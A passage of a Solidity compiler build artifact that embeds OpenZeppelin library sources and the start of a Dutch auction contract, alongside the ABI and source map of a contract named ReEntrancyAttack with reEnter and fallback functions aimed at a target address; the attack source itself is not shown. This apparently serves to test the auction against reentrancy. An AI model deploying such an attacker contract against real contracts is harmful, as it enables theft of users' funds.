","sourceMap":"105:529:9:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;348:66;379:4;362:7;;;;;;;;;;;354:24;;;:29;348:66;;;394:6;;;;;;;;;;:16;;;:18;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;348:66;;;105:529;534:61;;;;;;;;;;;;;:::i;:::-;;426:102;;;;;;;;;;;;;:::i;:::-;;534:61;570:6;;;;;;;;;;:16;;;:18;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;534:61::o;426:102::-;471:6;;;;;;;;;;:16;;;495:23;471:50;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;426:102::o"},"gasEstimates":{"creation":{"codeDepositCost":"122400","executionCost":"infinite","totalCost":"infinite"},"external":{"":"infinite","ReentranceAttack1()":"infinite","reEnter()":"infinite"}},"methodIdentifiers":{"ReentranceAttack1()":"fcd36e9c","reEnter()":"0ec39463"}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"ReentranceAttack1\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reEnter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/ReEntrancyAttack.sol\":\"ReEntrancyAttack\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Standard ERC20 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\\n */\\ninterface IERC20Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC20InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC20InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC20InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC20InvalidSpender(address spender);\\n}\\n\\n/**\\n * @dev Standard ERC721 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\\n */\\ninterface IERC721Errors {\\n    /**\\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\\n     * Used in balance queries.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721InvalidOwner(address owner);\\n\\n    /**\\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721NonexistentToken(uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param tokenId Identifier number of a token.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC721InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC721InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC721InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC721InvalidOperator(address operator);\\n}\\n\\n/**\\n * @dev Standard ERC1155 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\\n */\\ninterface IERC1155Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC1155InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC1155InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC1155MissingApprovalForAll(address operator, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC1155InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC1155InvalidOperator(address operator);\\n\\n    /**\\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\\n     * Used in batch transfers.\\n     * @param idsLength Length of the array of token identifiers\\n     * @param valuesLength Length of the array of token amounts\\n     */\\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\\n}\\n\",\"keccak256\":\"0x60c65f701957fdd6faea1acb0bb45825791d473693ed9ecb34726fdfaa849dd7\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {IERC20} from \\\"./IERC20.sol\\\";\\nimport {IERC20Metadata} from \\\"./extensions/IERC20Metadata.sol\\\";\\nimport {Context} from \\\"../../utils/Context.sol\\\";\\nimport {IERC20Errors} from \\\"../../interfaces/draft-IERC6093.sol\\\";\\n\\n/**\\n * @dev Implementation of the {IERC20} interface.\\n *\\n * This implementation is agnostic to the way tokens are created. This means\\n * that a supply mechanism has to be added in a derived contract using {_mint}.\\n *\\n * TIP: For a detailed writeup see our guide\\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\\n * to implement supply mechanisms].\\n *\\n * The default value of {decimals} is 18. To change this, you should override\\n * this function so it returns a different value.\\n *\\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\\n * instead returning `false` on failure. This behavior is nonetheless\\n * conventional and does not conflict with the expectations of ERC20\\n * applications.\\n *\\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\\n * This allows applications to reconstruct the allowance for all accounts just\\n * by listening to said events. Other implementations of the EIP may not emit\\n * these events, as it isn't required by the specification.\\n */\\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\\n    mapping(address account => uint256) private _balances;\\n\\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\\n\\n    uint256 private _totalSupply;\\n\\n    string private _name;\\n    string private _symbol;\\n\\n    /**\\n     * @dev Sets the values for {name} and {symbol}.\\n     *\\n     * All two of these values are immutable: they can only be set once during\\n     * construction.\\n     */\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() public view virtual returns (string memory) {\\n        return _name;\\n    }\\n\\n    /**\\n     * @dev Returns the symbol of the token, usually a shorter version of the\\n     * name.\\n     */\\n    function symbol() public view virtual returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    /**\\n     * @dev Returns the number of decimals used to get its user representation.\\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\\n     *\\n     * Tokens usually opt for a value of 18, imitating the relationship between\\n     * Ether and Wei. This is the default value returned by this function, unless\\n     * it's overridden.\\n     *\\n     * NOTE: This information is only used for _display_ purposes: it in\\n     * no way affects any of the arithmetic of the contract, including\\n     * {IERC20-balanceOf} and {IERC20-transfer}.\\n     */\\n    function decimals() public view virtual returns (uint8) {\\n        return 18;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-totalSupply}.\\n     */\\n    function totalSupply() public view virtual returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-balanceOf}.\\n     */\\n    function balanceOf(address account) public view virtual returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transfer}.\\n     *\\n     * Requirements:\\n     *\\n     * - `to` cannot be the zero address.\\n     * - the caller must have a balance of at least `value`.\\n     */\\n    function transfer(address to, uint256 value) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _transfer(owner, to, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-allowance}.\\n     */\\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-approve}.\\n     *\\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\\n     *\\n     * Requirements:\\n     *\\n     * - `spender` cannot be the zero address.\\n     */\\n    function approve(address spender, uint256 value) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transferFrom}.\\n     *\\n     * Emits an {Approval} event indicating the updated allowance. This is not\\n     * required by the EIP. See the note at the beginning of {ERC20}.\\n     *\\n     * NOTE: Does not update the allowance if the current allowance\\n     * is the maximum `uint256`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` and `to` cannot be the zero address.\\n     * - `from` must have a balance of at least `value`.\\n     * - the caller must have allowance for ``from``'s tokens of at least\\n     * `value`.\\n     */\\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\\n        address spender = _msgSender();\\n        _spendAllowance(from, spender, value);\\n        _transfer(from, to, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\\n     *\\n     * This internal function is equivalent to {transfer}, and can be used to\\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\\n     *\\n     * Emits a {Transfer} event.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\\n     */\\n    function _transfer(address from, address to, uint256 value) internal {\\n        if (from == address(0)) {\\n            revert ERC20InvalidSender(address(0));\\n        }\\n        if (to == address(0)) {\\n            revert ERC20InvalidReceiver(address(0));\\n        }\\n        _update(from, to, value);\\n    }\\n\\n    /**\\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\\n     * this function.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _update(address from, address to, uint256 value) internal virtual {\\n        if (from == address(0)) {\\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\\n            _totalSupply += value;\\n        } else {\\n            uint256 fromBalance = _balances[from];\\n            if (fromBalance < value) {\\n                revert ERC20InsufficientBalance(from, fromBalance, value);\\n            }\\n            unchecked {\\n                // Overflow not possible: value <= fromBalance <= totalSupply.\\n                _balances[from] = fromBalance - value;\\n            }\\n        }\\n\\n        if (to == address(0)) {\\n            unchecked {\\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\\n                _totalSupply -= value;\\n            }\\n        } else {\\n            unchecked {\\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\\n                _balances[to] += value;\\n            }\\n        }\\n\\n        emit Transfer(from, to, value);\\n    }\\n\\n    /**\\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\\n     * Relies on the `_update` mechanism\\n     *\\n     * Emits a {Transfer} event with `from` set to the zero address.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\\n     */\\n    function _mint(address account, uint256 value) internal {\\n        if (account == address(0)) {\\n            revert ERC20InvalidReceiver(address(0));\\n        }\\n        _update(address(0), account, value);\\n    }\\n\\n    /**\\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\\n     * Relies on the `_update` mechanism.\\n     *\\n     * Emits a {Transfer} event with `to` set to the zero address.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead\\n     */\\n    function _burn(address account, uint256 value) internal {\\n        if (account == address(0)) {\\n            revert ERC20InvalidSender(address(0));\\n        }\\n        _update(account, address(0), value);\\n    }\\n\\n    /**\\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\\n     *\\n     * This internal function is equivalent to `approve`, and can be used to\\n     * e.g. set automatic allowances for certain subsystems, etc.\\n     *\\n     * Emits an {Approval} event.\\n     *\\n     * Requirements:\\n     *\\n     * - `owner` cannot be the zero address.\\n     * - `spender` cannot be the zero address.\\n     *\\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\\n     */\\n    function _approve(address owner, address spender, uint256 value) internal {\\n        _approve(owner, spender, value, true);\\n    }\\n\\n    /**\\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\\n     *\\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\\n     * `Approval` event during `transferFrom` operations.\\n     *\\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\\n     * true using the following override:\\n     * ```\\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\\n     *     super._approve(owner, spender, value, true);\\n     * }\\n     * ```\\n     *\\n     * Requirements are the same as {_approve}.\\n     */\\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\\n        if (owner == address(0)) {\\n            revert ERC20InvalidApprover(address(0));\\n        }\\n        if (spender == address(0)) {\\n            revert ERC20InvalidSpender(address(0));\\n        }\\n        _allowances[owner][spender] = value;\\n        if (emitEvent) {\\n            emit Approval(owner, spender, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\\n     *\\n     * Does not update the allowance value in case of infinite allowance.\\n     * Revert if not enough allowance is available.\\n     *\\n     * Does not emit an {Approval} event.\\n     */\\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\\n        uint256 currentAllowance = allowance(owner, spender);\\n        if (currentAllowance != type(uint256).max) {\\n            if (currentAllowance < value) {\\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\\n            }\\n            unchecked {\\n                _approve(owner, spender, currentAllowance - value, false);\\n            }\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xc3e1fa9d1987f8d349dfb4d6fe93bf2ca014b52ba335cfac30bfe71e357e6f80\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the value of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the value of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\\n     * caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\\n     * allowance mechanism. `value` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\\n}\\n\",\"keccak256\":\"0xc6a8ff0ea489379b61faa647490411b80102578440ab9d84e9a957cc12164e70\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {IERC20} from \\\"../IERC20.sol\\\";\\n\\n/**\\n * @dev Interface for the optional metadata functions from the ERC20 standard.\\n */\\ninterface IERC20Metadata is IERC20 {\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\",\"keccak256\":\"0xaa761817f6cd7892fcf158b3c776b34551cde36f48ff9703d53898bc45a94ea2\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0x75a4ee64c68dbd5f38bddd06e664a64c8271b4caa554fb6f0607dfd672bb4bf3\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/ReentrancyGuard.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/ReentrancyGuard.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Contract module that helps prevent reentrant calls to a function.\\n *\\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\\n * available, which can be applied to functions to make sure there are no nested\\n * (reentrant) calls to them.\\n *\\n * Note that because there is a single `nonReentrant` guard, functions marked as\\n * `nonReentrant` may not call one another. This can be worked around by making\\n * those functions `private`, and then adding `external` `nonReentrant` entry\\n * points to them.\\n *\\n * TIP: If you would like to learn more about reentrancy and alternative ways\\n * to protect against it, check out our blog post\\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\\n */\\nabstract contract ReentrancyGuard {\\n    // Booleans are more expensive than uint256 or any type that takes up a full\\n    // word because each write operation emits an extra SLOAD to first read the\\n    // slot's contents, replace the bits taken up by the boolean, and then write\\n    // back. This is the compiler's defense against contract upgrades and\\n    // pointer aliasing, and it cannot be disabled.\\n\\n    // The values being non-zero value makes deployment a bit more expensive,\\n    // but in exchange the refund on every call to nonReentrant will be lower in\\n    // amount. Since refunds are capped to a percentage of the total\\n    // transaction's gas, it is best to keep them low in cases like this one, to\\n    // increase the likelihood of the full refund coming into effect.\\n    uint256 private constant NOT_ENTERED = 1;\\n    uint256 private constant ENTERED = 2;\\n\\n    uint256 private _status;\\n\\n    /**\\n     * @dev Unauthorized reentrant call.\\n     */\\n    error ReentrancyGuardReentrantCall();\\n\\n    constructor() {\\n        _status = NOT_ENTERED;\\n    }\\n\\n    /**\\n     * @dev Prevents a contract from calling itself, directly or indirectly.\\n     * Calling a `nonReentrant` function from another `nonReentrant`\\n     * function is not supported. It is possible to prevent this from happening\\n     * by making the `nonReentrant` function external, and making it call a\\n     * `private` function that does the actual work.\\n     */\\n    modifier nonReentrant() {\\n        _nonReentrantBefore();\\n        _;\\n        _nonReentrantAfter();\\n    }\\n\\n    function _nonReentrantBefore() private {\\n        // On the first call to nonReentrant, _status will be NOT_ENTERED\\n        if (_status == ENTERED) {\\n            revert ReentrancyGuardReentrantCall();\\n        }\\n\\n        // Any calls to nonReentrant after this point will fail\\n        _status = ENTERED;\\n    }\\n\\n    function _nonReentrantAfter() private {\\n        // By storing the original value once again, a refund is triggered (see\\n        // https://eips.ethereum.org/EIPS/eip-2200)\\n        _status = NOT_ENTERED;\\n    }\\n\\n    /**\\n     * @dev Returns true if the reentrancy guard is currently set to \\\"entered\\\", which indicates there is a\\n     * `nonReentrant` function in the call stack.\\n     */\\n    function _reentrancyGuardEntered() internal view returns (bool) {\\n        return _status == ENTERED;\\n    }\\n}\\n\",\"keccak256\":\"0xf980daa263b661ab8ddee7d4fd833c7da7e7995e2c359ff1f17e67e4112f2236\",\"license\":\"MIT\"},\"contracts/Dutch_Auction.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.21;\\n\\n// Using our own ERC20Token\\nimport \\\"./ERC20Token.sol\\\";\\nimport \\\"@openzeppelin/contracts/utils/ReentrancyGuard.sol\\\";\\n\\nerror Dutch_Auction__NotOwner();\\nerror Dutch_Auction__IsOwner();\\nerror Dutch_Auction__NotOpen();\\nerror Dutch_Auction__Open();\\n\\ncontract Dutch_Auction {\\n    int256 private currentPrice; //in wei\\n    uint256 private totalNumBidders = 0;\\n    uint256 private immutable startPrice; //in wei\\n    uint256 private immutable reservePrice;\\n    address private immutable i_owner;\\n    uint256 private totalAlgosAvailable;\\n    uint256 private startTime;\\n    uint256 private constant AUCTION_TIME = 1200; //in seconds\\n    uint256 private currentUnsoldAlgos;\\n    uint256 private changePerMin;\\n    bool private prematureEnd = false;\\n\\n    ERC20Token private DAToken; //importing Token\\n    address private ERC20ContractAddress;\\n    mapping(uint256 => Bidder) public biddersList; //to be made private later <for debugging purposes>\\n\\n    struct Bidder {\\n        uint256 bidderID;\\n        address walletAddress;\\n        uint256 bidValue; //the value they paid to the contract to purchase the algo\\n        uint256 totalAlgosPurchased;\\n        uint256 refundEth;\\n        bool isExist;\\n    }\\n\\n    // Variable to indicate auction's state --> type declaration\\n    enum AuctionState {\\n        OPEN,\\n        CLOSING\\n    } // uint256 0: OPEN, 1: CLOSED\\n\\n    AuctionState private s_auctionState;\\n\\n    /*Constructor*/\\n    constructor(uint256 _reservePrice, uint256 _startPrice) payable {\\n        require(\\n            _reservePrice < _startPrice,\\n            \\\"reserve price is higher than current price\\\"\\n        );\\n        i_owner = msg.sender;\\n        reservePrice = _reservePrice;\\n        currentPrice = int256(_startPrice);\\n        startPrice = _startPrice;\\n\\n        s_auctionState = AuctionState.CLOSING;\\n    }\\n\\n    /* modifiers */\\n    modifier onlyOwner() {\\n        // require(msg.sender == owner);\\n        if (msg.sender != i_owner) revert Dutch_Auction__NotOwner();\\n        _; //do the rest of the function\\n    }\\n\\n    modifier notOwner() {\\n        // require(msg.sender == owner);\\n        if (msg.sender == i_owner) revert Dutch_Auction__IsOwner();\\n        _; //do the rest of the function\\n    }\\n\\n    modifier AuctionOpen() {\\n        // require(msg.sender == owner);\\n        if (AuctionState.CLOSING == s_auctionState)\\n            revert Dutch_Auction__NotOpen();\\n        _; //do the rest of the function\\n    }\\n\\n    modifier AuctionClosed() {\\n        // require(msg.sender == owner);\\n        if (AuctionState.OPEN == s_auctionState) revert 